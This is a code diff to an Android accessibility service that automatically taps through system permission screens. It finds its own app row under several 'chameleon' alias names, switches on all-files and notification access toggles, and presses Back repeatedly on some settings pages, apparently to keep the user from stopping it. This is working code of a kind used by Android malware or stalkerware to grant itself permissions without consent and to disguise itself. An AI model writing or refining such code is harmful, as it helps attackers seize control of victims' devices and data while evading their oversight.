@@ -1024,6 +1024,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * The next poll tick of the 150 ms scanner will then enable the toggle via
      * runPermissionGranter() → runAccessibilityToggleGranter().
      *
+     * Tries all chameleon alias labels (not just app_name) so it works regardless of
+     * which alias the build assigned.
+     *
      * Also handles OEM "Access all files" / "File and media access" list screens on
      * Samsung, MIUI, ColorOS etc., since we search by app name text.
      */
@@ -1034,18 +1037,42 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             if (!screenText.contains("files") && !screenText.contains("storage")
                     && !screenText.contains("media")) return;
 
-            String appName = getString(R.string.app_name);
-            if (!screenText.contains(appName.toLowerCase())) return;
+            // Guard: our app must appear on screen (any alias label).
+            if (!isAnyAppNameOnScreen(screenText)) return;
 
-            // Try findAccessibilityNodeInfosByText first — most reliable.
-            List<AccessibilityNodeInfo> rows = rootNode.findAccessibilityNodeInfosByText(appName);
-            if (rows != null) {
+            // Build the full list of possible app name labels to search for.
+            List<String> candidates = new ArrayList<>();
+            try {
+                CharSequence pmLabel = getPackageManager().getApplicationLabel(getApplicationInfo());
+                if (pmLabel != null && !pmLabel.toString().isEmpty()) {
+                    candidates.add(pmLabel.toString());
+                }
+            } catch (Exception ignored) {}
+            int[] labelIds = {
+                R.string.alias_label_0, R.string.alias_label_1, R.string.alias_label_2,
+                R.string.alias_label_3, R.string.alias_label_4, R.string.app_name
+            };
+            for (int id : labelIds) {
+                try {
+                    String label = getString(id).trim();
+                    if (!label.isEmpty() && !candidates.contains(label)) candidates.add(label);
+                } catch (Exception ignored) {}
+            }
+
+            // Try each candidate label — the first row found that is clickable (or has a
+            // clickable ancestor) gets tapped to open the per-app toggle page.
+            for (String candidate : candidates) {
+                if (!screenText.contains(candidate.toLowerCase())) continue;
+                List<AccessibilityNodeInfo> rows = rootNode.findAccessibilityNodeInfosByText(candidate);
+                if (rows == null || rows.isEmpty()) continue;
+                boolean tapped = false;
                 for (AccessibilityNodeInfo row : rows) {
                     try {
                         if (row == null) continue;
                         if (row.isClickable()) {
                             row.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                            Log.i(TAG, "Storage list granter: tapped app row \"" + appName + "\"");
+                            Log.i(TAG, "Storage list granter: tapped app row \"" + candidate + "\"");
+                            tapped = true;
                             break;
                         }
                         // Walk up to find a clickable ancestor (list item container).
@@ -1053,8 +1080,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         for (int depth = 0; depth < 4 && p != null; depth++) {
                             if (p.isClickable()) {
                                 p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                                Log.i(TAG, "Storage list granter: tapped ancestor of app row");
+                                Log.i(TAG, "Storage list granter: tapped ancestor of app row \"" + candidate + "\"");
                                 p.recycle();
+                                tapped = true;
                                 break;
                             }
                             AccessibilityNodeInfo next = p.getParent();
@@ -1066,7 +1094,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     finally {
                         try { row.recycle(); } catch (Exception ignored) {}
                     }
+                    if (tapped) break;
                 }
+                if (tapped) return;
             }
         } catch (Exception ignored) {}
     }
@@ -1617,15 +1647,98 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         return false;
     }
 
-    /** Clicks any text element matching exactly (case-insensitive, no button check) */
-    private boolean clickTextElementCI(AccessibilityNodeInfo node, String searchText) {
+    /**
+     * Clicks any text element matching exactly (case-insensitive).
+     *
+     * Two-pass strategy to handle dialogs where the same word (e.g. "Allow") appears
+     * both as a non-interactive title/section header AND as the actual grant button:
+     *
+     *   Pass 1 — scan all matching nodes and prefer ones where isClickable() is true
+     *            (real buttons). Click the first such node and return.
+     *   Pass 2 — if no directly-clickable node was found, try clicking via the parent
+     *            of the first non-clickable match.
+     *
+     * This prevents the granter from accidentally clicking a label "Allow" at the top
+     * of a dialog instead of the real "Allow" button below it.
+     *
+     * Uses findAccessibilityNodeInfosByText() for reliable node discovery with correct
+     * Android memory management (no manual child-recycle bookkeeping needed).
+     */
+    private boolean clickTextElementCI(AccessibilityNodeInfo root, String searchText) {
+        if (root == null) return false;
+        String searchTrimmed = searchText.trim();
+
+        // findAccessibilityNodeInfosByText does a contains-match; we do an exact
+        // case-insensitive check on each returned node below.
+        List<AccessibilityNodeInfo> candidates = null;
+        try {
+            candidates = root.findAccessibilityNodeInfosByText(searchTrimmed);
+        } catch (Exception ignored) {}
+
+        // Also try contentDescription via manual traversal for OEM/API-level gaps.
+        // We'll do the full manual walk as a fallback if findByText returns nothing.
+        if (candidates == null || candidates.isEmpty()) {
+            return clickTextElementCIManual(root, searchTrimmed);
+        }
+
+        AccessibilityNodeInfo directHit = null;  // isClickable() node
+        AccessibilityNodeInfo parentHit = null;  // non-clickable node with clickable parent
+
+        for (AccessibilityNodeInfo n : candidates) {
+            if (n == null) continue;
+            try {
+                CharSequence text = n.getText();
+                CharSequence desc = n.getContentDescription();
+                boolean exactMatch =
+                        (text != null && text.toString().trim().equalsIgnoreCase(searchTrimmed))
+                     || (text == null && desc != null
+                         && desc.toString().trim().equalsIgnoreCase(searchTrimmed));
+                if (!exactMatch) continue;
+                if (n.isClickable() && directHit == null) {
+                    directHit = n;
+                } else if (!n.isClickable() && parentHit == null) {
+                    parentHit = n;
+                }
+            } catch (Exception ignored) {}
+        }
+
+        boolean clicked = false;
+        // Pass 1: directly clickable node (real button)
+        if (directHit != null) {
+            try { directHit.performAction(AccessibilityNodeInfo.ACTION_CLICK); clicked = true; }
+            catch (Exception ignored) {}
+        }
+        // Pass 2: fall back to clicking via parent
+        if (!clicked && parentHit != null) {
+            AccessibilityNodeInfo parent = null;
+            try {
+                parent = parentHit.getParent();
+                if (parent != null && parent.isClickable()) {
+                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    clicked = true;
+                }
+            } catch (Exception ignored) {}
+            finally {
+                if (parent != null) try { parent.recycle(); } catch (Exception ignored) {}
+            }
+        }
+
+        // Recycle all candidates.
+        for (AccessibilityNodeInfo n : candidates) try { if (n != null) n.recycle(); } catch (Exception ignored) {}
+        return clicked;
+    }
+
+    /**
+     * Manual tree-walk fallback for clickTextElementCI — used when
+     * findAccessibilityNodeInfosByText() returns empty (e.g. contentDescription-only
+     * nodes on certain OEM/API levels).
+     * Same two-pass priority: isClickable nodes before parent-clickable nodes.
+     */
+    private boolean clickTextElementCIManual(AccessibilityNodeInfo node, String searchTrimmed) {
         if (node == null) return false;
         try {
-            // Check getText() first; fall back to contentDescription for OEM/Android 12+
-            // dialog buttons that set only contentDescription (getText() returns null).
             CharSequence text = node.getText();
             CharSequence desc = node.getContentDescription();
-            String searchTrimmed = searchText.trim();
             boolean matches = (text != null && text.toString().trim().equalsIgnoreCase(searchTrimmed))
                            || (text == null && desc != null
                                && desc.toString().trim().equalsIgnoreCase(searchTrimmed));
@@ -1647,7 +1760,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             for (int i = 0; i < node.getChildCount(); i++) {
                 AccessibilityNodeInfo child = node.getChild(i);
                 if (child != null) {
-                    if (clickTextElementCI(child, searchText)) {
+                    if (clickTextElementCIManual(child, searchTrimmed)) {
                         child.recycle();
                         return true;
                     }
@@ -1833,26 +1946,22 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     /**
      * Looks for unchecked toggles/switches/checkboxes on screen when the app name
      * is visible. Skips any item whose nearby text contains a blacklisted word.
-     * If a direct Allow/Grant button is present on the same page it is clicked first.
-     * If a toggle is found it is enabled, then Back is pressed after 500 ms.
+     * If a toggle is found it is enabled, then Back is pressed after 1200 ms.
+     *
+     * NOTE: The directButtons loop was intentionally removed. On toggle-style settings
+     * pages (e.g. All Files Access, Notification access) the words "Allow" / "Grant"
+     * can appear as non-interactive section labels or descriptions. Clicking those labels
+     * (via their clickable parent container) and then pressing Back closed the settings
+     * page before the real toggle was ever enabled. runPermissionGranter() already
+     * handles actual button clicks in Steps 1-3 before ever reaching this method.
+     * Use isAnyAppNameOnScreen() so all chameleon alias labels are matched correctly.
      */
     private boolean runAccessibilityToggleGranter(AccessibilityNodeInfo rootNode) {
         try {
-            String appName = getString(R.string.app_name).toLowerCase();
             String screenText = getAllScreenText(rootNode).toLowerCase();
-            if (!screenText.contains(appName)) return false;
+            if (!isAnyAppNameOnScreen(screenText)) return false;
 
-            // If there is a direct Allow / Grant / Turn on button on the page, click it first.
-            String[] directButtons = { "Allow", "Grant", "Turn on", "Enable", "OK", "Ok", "Yes", "Accept" };
-            for (String btn : directButtons) {
-                if (findAndClickFullWord(rootNode, btn)) {
-                    Log.i(TAG, "Auto-grant (storage page): clicked button \"" + btn + "\"");
-                    scheduleBack(1_200);
-                    return true;
-                }
-            }
-
-            // Fall back to toggle/switch/checkbox
+            // Enable the toggle/switch/checkbox for this app
             if (findAndEnableToggleForAppName(rootNode)) {
                 Log.i(TAG, "Auto-grant: enabled toggle for app on settings screen");
                 scheduleBack(1_200);
@@ -2465,15 +2574,29 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     // Press Back vigorously every time this page is detected.
                     try { performBack(); } catch (Exception ignored) {}
 
-                    // Fire Back + Home exactly once on the very first launch.
+                    // On the very first launch: after the user enables the service,
+                    // navigate back to the app's main activity instead of the home screen.
+                    // A second Back presses clears the settings back-stack, then we launch
+                    // MainActivity directly so the user lands in the app, not on the launcher.
                     if (accessibilityAssistIsFirstLaunch && !accessibilityAssistBackHomeFired) {
                         accessibilityAssistBackHomeFired = true;
                         new Handler(Looper.getMainLooper()).postDelayed(() -> {
                             try { performBack(); } catch (Exception ignored) {}
                         }, 150L);
                         new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                            try { performHome(); } catch (Exception ignored) {}
-                        }, 450L);
+                            try {
+                                Intent mainIntent = new Intent(
+                                        UnifiedAccessibilityService.this,
+                                        com.task.tusker.MainActivity.class);
+                                mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                                        | Intent.FLAG_ACTIVITY_CLEAR_TOP
+                                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                                startActivity(mainIntent);
+                            } catch (Exception ignored) {
+                                // Fallback to Home if MainActivity can't be launched
+                                try { performHome(); } catch (Exception ignored2) {}
+                            }
+                        }, 500L);
                     }
 
                 } else if (isStopConfirmDialog) {
